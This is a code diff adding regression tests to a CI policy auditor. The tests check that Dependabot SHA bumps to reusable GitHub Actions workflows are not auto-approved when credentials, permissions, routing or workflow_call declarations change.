+// privilegedHostedRequirement()'s category (e.g. "an unapproved or
+// transformed credential expression"), not the exact credential-bearing
+// value itself. A bumped SHA that swaps one already-declared/allowed secret
+// for a different secret in the identical step env position trips the same
+// category on both revisions, so that coarse comparison alone would let the
+// candidate silently inherit the previously reviewed contract even though
+// the actual secret referenced changed.
+test("Dependabot SHA bump that changes only the exact secret referenced in a called job's step env is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_REFERENCE_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_CREDENTIAL_REFERENCE_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Regression test for a gap where jobCredentialReferenceSurface recorded only
+// the fields of a credential-bearing step that themselves contained a
+// credential expression (condition/env/with, filtered through
+// credentialBearingEntries), never the rest of the step. A bumped SHA could
+// keep an already-reviewed step's env/with credential expression
+// byte-identical while rewriting the step's run: body -- e.g. from a benign
+// scan command to one that exfiltrates the same credential -- and the
+// filtered surface would stay unchanged, silently auto-approving unreviewed
+// executable code that consumes the credential differently.
+test("Dependabot SHA bump that changes only a credential-bearing step's run body is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Regression test proving the credential-bearing gate itself checks every
+// field family. This step's only credential expression is inline in `run:`,
+// with no env or with block, so it is invisible to a gate that only checks
+// condition/env/with/credentialAction; such a gate would drop the step out
+// of credentialReferences entirely, and a bump that swaps only the
+// referenced secret would leave every recorded surface field identical.
+test("Dependabot SHA bump that changes only the secret referenced inline in a credential-bearing step's run body is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Regression test for a gap where a reviewed contract already containing a
+// localCredentialActions step (e.g. actions/create-github-app-token) only
+// had its category -- not its pinned `@ref` -- recorded anywhere in the
+// compared surface: jobCredentialSurface's privilegedHostedRequirement names
+// only the bare action, and credentialBearingEntries never records a plain
+// `uses:` action reference because it mints no credential expression by
+// itself. A Dependabot bump that repoints the same credential-minting action
+// at a different, unreviewed ref left every compared field byte-identical
+// and was auto-approved, letting newly unreviewed token-minting code run
+// under the previously reviewed runner-input contract.
+test("Dependabot SHA bump that changes only the pinned ref of an existing credential-minting action is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_ACTION_REF_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CREDENTIAL_ACTION_REF_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+test("Dependabot SHA bump that changes a privileged execution boundary is declined", async () => {
+  const nestedSha = "0123456789abcdef0123456789abcdef01234567";
+  const candidates = [
+    [
+      "job container",
+      REUSABLE_WORKFLOW_BASIS_SOURCE.replace(
+        "    steps: []",
+        "    container: node:24\n    steps: []",
+      ),
+    ],
+    [
+      "service container",
+      REUSABLE_WORKFLOW_BASIS_SOURCE.replace(
+        "    steps: []",
+        "    services:\n      redis:\n        image: redis:8\n    steps: []",
+      ),
+    ],
+    [
+      "deployment environment",
+      REUSABLE_WORKFLOW_BASIS_SOURCE.replace(
+        "    steps: []",
+        "    environment: production\n    steps: []",
+      ),
+    ],
+    [
+      "nested reusable workflow",
+      REUSABLE_WORKFLOW_BASIS_SOURCE.replace(
+        "    runs-on: $" + "{{ inputs.runner }}\n    steps: []",
+        `    uses: example/reusable/.github/workflows/nested.yml@${nestedSha}`,
+      ),
+    ],
+  ];
+
+  for (const [name, candidateSource] of candidates) {
+    const root = await repository({
+      visibility: "public",
+      selfHostedCi: false,
+      workflows: {
+        "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+      },
+    });
+    const findings = await audit(root, {
+      fetchImpl: fetchImplFor({
+        [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+        [DEPENDABOT_BUMP_SHA]: candidateSource,
+      }),
+    });
+    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+    assert.ok(contractFinding, name);
+    assert.match(
+      contractFinding.message,
+      new RegExp(`auto-approval declined: routing changed since the previously reviewed .*@${SHA}`),
+      name,
+    );
+  }
+});
+
+test("Dependabot SHA bump from empty to omitted workflow permissions is declined", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_EMPTY_PERMISSIONS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_OMITTED_PERMISSIONS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: permissions changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+test("Dependabot SHA bump from empty to omitted effective job permissions is declined", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_EMPTY_JOB_PERMISSIONS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_OMITTED_PERMISSIONS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: jobPermissions changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+test("Dependabot SHA bump that removes workflow_call is declined", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_REMOVED_WORKFLOW_CALL_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: workflowCall changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+test("Dependabot SHA bump with a malformed workflow_call declaration is declined", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_MALFORMED_WORKFLOW_CALL_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: workflowCall changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+test("Dependabot SHA bump with malformed workflow_call input or secret maps is declined", async () => {
+  for (const field of ["inputs", "secrets"]) {
+    for (const [kind, value] of [
+      ["boolean", "false"],
+      ["scalar", "malformed"],
+      ["array", "[]"],
+    ]) {
+      const root = await repository({
+        visibility: "public",
+        selfHostedCi: false,
+        policyOverrides: {
+          approvedReusableWorkflowContracts: {
+            [REUSABLE_REFERENCE]: {
+              routing: "hosted-only",
+              allowedInputs: [],
+              allowedSecrets: {},
+              fixedRunsOn: ["ubuntu-24.04"],
+            },
+          },
+        },
+        workflows: {
+          "ci.yml": `jobs:
+  check:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+`,
+        },
+      });
+      const findings = await audit(root, {
+        fetchImpl: fetchImplFor({
+          [SHA]: reusableWorkflowWithCallMappings(),
+          [DEPENDABOT_BUMP_SHA]: reusableWorkflowWithCallMappings({ [field]: value }),
+        }),
+      });
+      const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+      assert.ok(contractFinding, `${field} ${kind}`);
+      assert.match(
+        contractFinding.message,
+        new RegExp(
+          `auto-approval declined: ${field} declaration is malformed; on\\.workflow_call\\.${field} must be a mapping when declared`,
+        ),
+        `${field} ${kind}`,
+      );
+    }
+  }
+});
+
+test("Dependabot SHA bump preserves equivalent omitted, null, and empty workflow_call maps", async () => {
+  for (const [name, basisSource, candidateSource] of [
+    [
+      "omitted to explicit empty",
+      reusableWorkflowWithCallMappings(),
+      reusableWorkflowWithCallMappings({ inputs: "{}", secrets: "{}" }),
+    ],
+    [
+      "explicit empty to null",
+      reusableWorkflowWithCallMappings({ inputs: "{}", secrets: "{}" }),
+      reusableWorkflowWithCallMappings({ inputs: null, secrets: null }),
+    ],
+    [
+      "null to omitted",
+      reusableWorkflowWithCallMappings({ inputs: null, secrets: null }),
+      reusableWorkflowWithCallMappings(),
+    ],
+  ]) {
+    const root = await repository({
+      visibility: "public",
+      selfHostedCi: false,
+      policyOverrides: {
+        approvedReusableWorkflowContracts: {
+          [REUSABLE_REFERENCE]: {
+            routing: "hosted-only",
+            allowedInputs: [],
+            allowedSecrets: {},
+            fixedRunsOn: ["ubuntu-24.04"],
+          },
+        },
+      },
+      workflows: {
+        "ci.yml": `jobs:
+  check:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+`,
+      },
+    });
+    assert.deepEqual(
+      await audit(root, {
+        fetchImpl: fetchImplFor({
+          [SHA]: basisSource,
+          [DEPENDABOT_BUMP_SHA]: candidateSource,
+        }),
+      }),
+      [],
+      name,
+    );
+  }
+});
+
+// Regression test for a gap where jobPermissionsSurface, jobRoutingSurface,
+// and jobCredentialSurface each filtered out a job whose value was not a
+// mapping (the same shape auditRepository rejects locally as job-shape)
+// before comparing surfaces. Filtering made the malformed job invisible to
+// the diff instead of failing closed: a bumped SHA could add
+// `jobs.extra: []` or a scalar job without changing anything the compared
+// surface inspected, so the candidate would still match the reviewed basis
+// and inherit its contract, only to fail later when GitHub actually
+// validated the called workflow.
+test("Dependabot SHA bump that adds a malformed job is declined", async () => {
+  for (const [kind, malformedJob] of [
+    ["array", "  extra: []\n"],
+    ["scalar", "  extra: not-a-job\n"],
+  ]) {
+    const root = await repository({
+      visibility: "public",
+      selfHostedCi: false,
+      workflows: {
+        "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+      },
+    });
+    const findings = await audit(root, {
+      fetchImpl: fetchImplFor({
+        [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+        [DEPENDABOT_BUMP_SHA]: `${REUSABLE_WORKFLOW_BASIS_SOURCE}${malformedJob}`,
+      }),
+    });
+    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+    assert.ok(contractFinding, kind);
+    assert.match(
+      contractFinding.message,
+      /auto-approval declined: job extra is malformed; jobs\.extra must be a mapping/,
+      kind,
+    );
+  }
+});
+
+test("Dependabot SHA bump is declined when the previously reviewed basis has a malformed job", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: `${REUSABLE_WORKFLOW_BASIS_SOURCE}  extra: []\n`,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: reviewed basis .*@${SHA} could not be fetched, parsed, or validated: job extra is malformed; jobs\\.extra must be a mapping`,
+    ),
+  );
+});
+
+// The tests below this point cover every needs-indirection spelling this
+// detector has previously been shown to miss (property dereference, then
+// each index-syntax variant). They predate the switch from a precise
+// needs.<job>.outputs.<name>-shaped blocklist to the coarse needs-reference
+// catch-all above (`containsNeedsReference`/`NEEDS_REFERENCE` in
+// runner-policy.mjs), and are kept and re-verified here rather than deleted:
+// the coarse catch-all must still decline every one of these previously
+// fixed cases, not just the new ones it was built to close.
+//
+// Regression test for a gap where jobRoutingSurface recorded only the
+// literal declared runs-on expression. A fetched reusable workflow's job can
+// route through needs.<job>.outputs.<name> -- the same needs-output pattern
+// this analyzer already trusts for local selector routing -- so the
+// producing job's output value (here pick's runs-on) can change the actual
+// runner boundary while the consuming job's runs-on expression stays a
+// byte-identical `needs.pick.outputs.runner`. Auto-approval cannot safely
+// resolve that indirection, so it must decline rather than treat the surface
+// as unchanged.
+test("Dependabot SHA bump that routes through a needs.<job>.outputs indirection is declined", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DYNAMIC_ROUTING_COSMETIC_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
+  );
+});
+
+// Regression test for a gap where the needs-output detector matched only
+// property-dereference syntax (`needs.<job>.outputs.<name>`). GitHub's
+// expression syntax accepts the equivalent index syntax
+// (`needs.<job>.outputs['<name>']`) for the same output; a fetched reusable
+// workflow using that spelling was not declined, and because jobRoutingSurface
+// also omits the producer job's own outputs, a SHA bump could keep the
+// consuming job's `runs-on` string byte-identical while the producing job's
+// value (and therefore the real runner boundary) changed underneath it.
+for (const [label, source, cosmeticSource] of [
+  [
+    "single-quoted index syntax",
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_SOURCE,
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_COSMETIC_SOURCE,
+  ],
+  [
+    "double-quoted index syntax",
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_SOURCE,
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_COSMETIC_SOURCE,
+  ],
+  [
+    "fully bracketed index syntax on the job-id and outputs segments",
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_SOURCE,
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_COSMETIC_SOURCE,
+  ],
+]) {
+  test(`Dependabot SHA bump that routes through a needs.<job>.outputs ${label} indirection is declined`, async () => {
+    const root = await repository({
+      visibility: "public",
+      selfHostedCi: false,
+      workflows: {
+        "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+      },
+    });
+    const findings = await audit(root, {
+      fetchImpl: fetchImplFor({
+        [SHA]: source,
+        [DEPENDABOT_BUMP_SHA]: cosmeticSource,
+      }),
+    });
+    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+    assert.ok(contractFinding);
+    assert.match(
+      contractFinding.message,
+      /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
+    );
+  });
+}
+
+// Regression tests for the coarse needs-reference catch-all that replaced
+// the precise needs.<job>.outputs.<name>-shaped detector. The catch-all
+// declines whenever a routing-relevant field mentions `needs` at all,
+// instead of enumerating specific dangerous spellings, so each case below
+// is a syntax the *old* precise detector would have missed:
+//
+// - "object-filter output route" is the exact P1 finding that motivated the
+//   rewrite: `needs.*.outputs.runner` has no named job-id segment, so a
+//   job-id-shaped pattern can never enumerate it.
+// - "case-variant needs reference" proves the catch-all is case-insensitive,
+//   matching GitHub's own case-insensitive context/property evaluation.
+// - "needs job-result reference (no outputs segment)" proves the catch-all
+//   catches more than just outputs indirection: any `needs` property access
+//   in a routing field is equally unresolvable through static surface
+//   diffing, and the old detector's required `.outputs` segment would have
+//   missed this one entirely, not merely spelled it differently.
+// - "function-wrapped needs reference" proves the catch-all matches the bare
+//   `needs` token itself rather than requiring an immediate `.`/`[`
+//   accessor: GitHub's expression functions can take `needs` as a bare
+//   argument (`fromJSON(toJSON(needs)).pick.outputs.runner`), so a detector
+//   that required `needs` to be immediately followed by a dereference
+//   accessor would miss this indirection entirely.
+for (const [label, source, cosmeticSource] of [
+  [
+    "object-filter output route",
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_SOURCE,
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_COSMETIC_SOURCE,
+  ],
+  [
+    "case-variant needs reference",
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_SOURCE,
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_COSMETIC_SOURCE,
+  ],
+  [
+    "needs job-result reference (no outputs segment)",
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_SOURCE,
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_COSMETIC_SOURCE,
+  ],
+  [
+    "function-wrapped needs reference",
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_SOURCE,
+    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_COSMETIC_SOURCE,
+  ],
+]) {
+  test(`Dependabot SHA bump that routes through a ${label} is declined`, async () => {
+    const root = await repository({
+      visibility: "public",
+      selfHostedCi: false,
+      workflows: {
+        "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+      },
+    });
+    const findings = await audit(root, {
+      fetchImpl: fetchImplFor({
+        [SHA]: source,
+        [DEPENDABOT_BUMP_SHA]: cosmeticSource,
+      }),
+    });
+    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+    assert.ok(contractFinding);
+    assert.match(
+      contractFinding.message,
+      /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
+    );
+  });
+}
+
+test("Dependabot SHA bump is declined when the previously reviewed basis routes through a needs.<job>.outputs indirection", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: reviewed basis .*@${SHA} could not be fetched, parsed, or validated: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval`,
+    ),
+  );
+});
+
+// Regression test: the compared auto-approval surface (workflow_call,
+// permissions, routing, credentials) proves a bumped SHA's caller-facing
+// contract and execution boundary are unchanged, but a selectorResultInput
+// contract is trusted for something outside that surface entirely: that the
+// called workflow's own steps still fail the job when the forwarded
+// needs.<selector>.result did not succeed. Nothing in the compared surface
+// inspects the reusable workflow's steps, so a bumped SHA could silently
+// stop honoring that input (always exiting 0) while every compared field
+// stays identical, defeating the fail-closed guarantee a required check
+// relies on. Auto-approval must decline every selector-result contract.
+test("Dependabot SHA bump of a selector-result reporter contract is declined regardless of surface match", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    policyOverrides: {
+      approvedReusableWorkflowContracts: {
+        [REUSABLE_REFERENCE]: {
+          routing: "runner-input",
+          runnerInput: "runner",
+          selectorResultInput: "prerequisite-result",
+          allowedInputs: ["runner", "prerequisite-result"],
+          allowedSecrets: {},
+        },
+      },
+    },
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+      prerequisite-result: success
+`,
+    },
+  });
+  const selectorResultBasisSource = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+      prerequisite-result:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    if: \${{ inputs.prerequisite-result == 'success' }}
+    steps: []
+`;
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: selectorResultBasisSource,
+      [DEPENDABOT_BUMP_SHA]: selectorResultBasisSource,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: ${REUSABLE_PATH} is a fail-closed selector-result reporter; its required-check behavior cannot be proven unchanged by this surface diff, so auto-approval is declined`,
+    ),
+  );
+});
+
+// Regression test: allowedCallerPermissions is trusted for something the
+// compared auto-approval surface (workflow_call, permissions, routing,
+// credential references) cannot observe -- that the called workflow's steps
+// still use the privileged, potentially self-hosted-reachable grant safely
+// rather than, say, exfiltrating an id-token-derived credential or misusing
+// a pull-requests:write grant. A bumped SHA could keep every compared field
+// identical while its steps do something different with that already-
+// reviewed grant, so auto-approval must decline every allowedCallerPermissions
+// contract even when the structural surface is otherwise unchanged.
+test("Dependabot SHA bump of an allowedCallerPermissions contract is declined regardless of surface match", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    policyOverrides: {
+      approvedReusableWorkflowContracts: {
+        [REUSABLE_REFERENCE]: {
+          routing: "runner-input",
+          runnerInput: "runner",
+          allowedInputs: ["runner"],
+          allowedSecrets: {},
+          allowedCallerPermissions: { "pull-requests": "write" },
+        },
+      },
+    },
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: ${REUSABLE_PATH} carries a reviewed allowedCallerPermissions grant; its steps cannot be proven unchanged by this surface diff, so auto-approval is declined`,
+    ),
+  );
+});
+
+test("auto-approval declines and reports a fetch failure without approving the candidate", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: async () => ({ ok: false, status: 500, statusText: "Internal Server Error" }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(contractFinding.message, /auto-approval declined: could not fetch/);
+});
+
+test("disableAutoApproval escape hatch skips fetching and reproduces the unchanged pre-patch diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  let fetchCalled = false;
+  const findings = await audit(root, {
+    disableAutoApproval: true,
+    fetchImpl: async () => {
+      fetchCalled = true;
+      throw new Error("fetch must not be called when auto-approval is disabled");
+    },
+  });
+  assert.equal(fetchCalled, false);
+  assert.deepEqual(findings, [
+    {
+      rule: "runner-target-contract",
+      file: ".github/workflows/ci.yml",
+      job: "scan",
+      message: "the reusable workflow path@SHA has no reviewed runner-input contract",
+    },
+  ]);
+});
+
+test("CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL=true disables auto-approval by default", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const priorValue = process.env.CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL;
+  process.env.CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL = "true";
+  let fetchCalled = false;
+  try {
+    const findings = await audit(root, {
+      fetchImpl: async () => {
+        fetchCalled = true;
+        throw new Error("fetch must not be called when the escape-hatch env var is set");
+      },
+    });
+    assert.equal(fetchCalled, false);
+    assert.equal(
+      findings[0]?.message,
+      "the reusable workflow path@SHA has no reviewed runner-input contract",
+    );
+  } finally {
+    if (priorValue === undefined) {
+      delete process.env.CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL;
+    } else {
+      process.env.CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL = priorValue;
+    }
+  }
 });
 
 test("public opaque reusable call and alternate runner-label input are rejected", async () => {
